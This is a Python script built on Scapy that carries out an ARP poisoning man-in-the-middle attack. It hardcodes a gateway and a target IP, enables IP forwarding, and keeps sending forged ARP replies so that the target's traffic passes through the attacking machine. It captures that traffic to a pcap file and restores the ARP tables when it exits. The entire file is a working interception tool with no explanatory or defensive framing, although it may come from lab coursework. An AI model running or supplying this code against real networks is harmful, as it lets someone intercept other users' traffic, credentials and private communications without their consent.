from scapy.all import *
import os
import signal
import sys
import threading
import time

#ARP Poison parameters
gateway_ip = "10.157.13.12"
target_ip = "10.157.13.10"
packet_count = 1000
conf.iface = "enp0s25"
conf.verb = 0

fakemac ="14:58:d0:08:e0:09"


#Given an IP, get the MAC. Broadcast ARP Request for a IP Address. Should recieve
#an ARP reply with MAC Address
def get_mac(ip_address):
    #ARP request is constructed. sr function is used to send/ receive a layer 3 packet
    #Alternative Method using Layer 2: resp, unans =  srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(op=1, pdst=ip_address))
    resp, unans = sr(ARP(op=1, hwdst="ff:ff:ff:ff:ff:ff", pdst=ip_address), retry=2, timeout=10)
    for s,r in resp:
        return r[ARP].hwsrc
    return None

#Restore the network by reversing the ARP poison attack. Broadcast ARP Reply with
#correct MAC and IP Address information
def restore_network(gateway_ip, gateway_mac, target_ip, target_mac):
    send(ARP(op=2, hwdst="ff:ff:ff:ff:ff:ff", pdst=gateway_ip, hwsrc=target_mac, psrc=target_ip), count=5)
    send(ARP(op=2, hwdst="ff:ff:ff:ff:ff:ff", pdst=target_ip, hwsrc=gateway_mac, psrc=gateway_ip), count=5)
    print("[*] Disabling IP forwarding")
    #Disable IP Forwarding on a mac
    os.system("sysctl -w net/ipv4/ip_forward=0")
    #kill process on a mac
    os.kill(os.getpid(), signal.SIGTERM)

#Keep sending false ARP replies to put our machine in the middle to intercept packets
#This will use our interface MAC address as the hwsrc for the ARP reply
def arp_poison(gateway_ip, gateway_mac, target_ip, target_mac):
    print("[*] Started ARP poison attack [CTRL-C to stop]")
    try:
        while True:
            send(ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac, psrc=target_ip))
            send(ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip))
            time.sleep(2)
    except KeyboardInterrupt:
        print("[*] Stopped ARP poison attack. Restoring network")
        restore_network(gateway_ip, gateway_mac, target_ip, target_mac)

#Start the script
print("[*] Starting script: arp_poison.py")
print("[*] Enabling IP forwarding")
#Enable IP Forwarding on a mac
os.system("sysctl -w net/ipv4/ip_forward=1")
print("[*] Gateway IP address: {}".format(gateway_ip))
print("[*] Target IP address: {}".format(target_ip))

gateway_mac = get_mac(gateway_ip)
if gateway_mac is None:
    print("[!] Unable to get gateway MAC address. Exiting..")
    sys.exit(0)
else:
    print("[*] Gateway MAC address: {}".format(gateway_mac))

target_mac = get_mac(target_ip)
if target_mac is None:
    print("[!] Unable to get target MAC address. Exiting..")
    sys.exit(0)
else:
    print("[*] Target MAC address: {}".format(target_mac))

#ARP poison thread
poison_thread = threading.Thread(target=arp_poison, args=(gateway_ip, gateway_mac, target_ip, target_mac))
poison_thread.start()

#Sniff traffic and write to file. Capture is filtered on target machine
try:
    sniff_filter = "ip host " + target_ip
    print("[*] Starting network capture. Packet Count: {}. Filter: {}".format(packet_count, sniff_filter))
    packets = sniff(filter=sniff_filter, iface=conf.iface) #, count=packet_count)
    wrpcap(target_ip + "_capture.pcap", packets)
    print("[*] Stopping network capture..Restoring network")
    restore_network(gateway_ip, gateway_mac, target_ip, target_mac)
except KeyboardInterrupt:
    print("[*] Stopping network capture..Restoring network")
    restore_network(gateway_ip, gateway_mac, target_ip, target_mac)
    sys.exit(0)
